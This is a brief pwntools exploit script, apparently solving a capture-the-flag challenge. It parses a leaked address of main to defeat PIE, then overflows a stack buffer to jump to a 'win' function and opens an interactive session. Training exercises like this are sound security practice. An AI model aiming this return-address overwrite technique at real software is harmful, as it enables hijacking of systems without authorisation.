from pwn import *
binary = context.binary = ELF('./chall_05')
p = process(binary.path)
p.recvuntil('I wonder what this is: ')
_ = p.recvline().strip()
stack = int(_,16)
binary.address = stack - binary.sym.main
p.sendline((0x60 - 0x8)*b'A' + p64(binary.sym.win) + b'')
p.interactive()
#FINISHED
